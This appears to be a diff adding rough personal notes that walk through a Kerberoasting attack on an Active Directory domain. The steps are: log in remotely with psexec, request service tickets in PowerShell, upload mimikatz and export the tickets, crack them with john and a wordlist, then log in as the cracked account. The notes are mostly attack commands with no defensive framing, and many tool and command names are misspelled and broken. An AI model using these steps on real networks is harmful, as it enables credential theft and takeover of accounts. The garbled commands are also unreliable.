@@ -1,0 +1,70 @@
+Kerborsting Attacke
+
+kerborsoe are manageing the authentication of this AD service
+
+
+login to the machine Enterprice
+
+impackt-psexec 'domain/username:password!ip' powershell.exe
+
+After that
+command = Add-Type -AssemblyName System.IdentityModel
+
+now you bring the ticket of kerbos users
+
+
+commnad = New-Object System.IdentityModel.Tokens.KerberoRequestorSecurityToken -ArgumentList  "SPN Valuse kerboros user"
+
+
+now ticket  is availabel in memory you need dump it memorty to hard disk for we can access the tickets
+
+exit powershell
+
+now login without powershell
+
+command = impackt-psexec 'domain/username:password!ip'
+
+command = lput mimikatz.exe
+command = lput mimilib.dll
+command = lput mimidrv.Sys
+
+
+open mimikataz
+
+
+now
+
+kerberos::list /export
+
+exit mimikatz
+
+
+commnad =let "tiket.kirbi"
+
+shot name file  command = dir /X
+
+now ticket.krirbi in local systme your and crack the hash of this ticket using kirbi2jhon
+
+command= kirbi2jhon tiket.kirbi > hash
+
+commnad = john hash --wordlist=rockeyou.txt
+
+
+now lgoin to to kerbors user using impacket-psexec
+
+command = impackt-psexec 'domain/username:password!ip'
+
+command = whomai
+
+
+
+
+
+
+
+
+
+
+
+
+
